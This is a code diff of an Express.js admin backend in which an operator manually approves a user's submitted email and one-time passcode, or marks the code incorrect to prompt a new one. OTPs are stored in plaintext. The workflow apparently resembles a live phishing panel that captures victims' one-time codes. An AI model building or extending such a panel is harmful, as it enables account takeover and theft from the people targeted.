@@ -451,24 +451,21 @@ app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
   }
 });
 
-// SINGLE APPROVE BUTTON - Approves email, first OTP, or second OTP based on current state
+// SINGLE APPROVE BUTTON - Approves email or first OTP based on current state
 app.post('/api/admin/approve', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    // Get current user state
     const user = await pool.query('SELECT approved, otp, second_approved FROM users WHERE email = $1', [email]);
     if (user.rows.length === 0) return res.status(404).json({ error: 'User not found' });
     
     const userData = user.rows[0];
     
     if (!userData.approved) {
-      // Approve email
       await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
       console.log('✅ Email approved for:', email);
     } else if (userData.approved && userData.otp && !userData.second_approved) {
-      // Approve first OTP
       await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
       console.log('✅ First OTP approved for:', email);
     }
@@ -532,21 +529,24 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// Incorrect OTP - Shows error message below input, clears input, resets
+// INCORRECT OTP - Resets OTP in database, shows error message once
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    // Set flag for incorrect OTP error message
+    // RESET OTP in database (clear it so user must submit new one)
     await pool.query(`
       UPDATE users SET 
+        otp = NULL,
+        approved = false,
         admin_text = 'incorrect_otp_error',
         text_release = false
       WHERE email = $1
     `, [email]);
     
-    console.log('🔴 Admin marked OTP as incorrect for user:', email);
+    console.log('🔴 Admin marked OTP as incorrect - OTP reset for user:', email);
+    
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
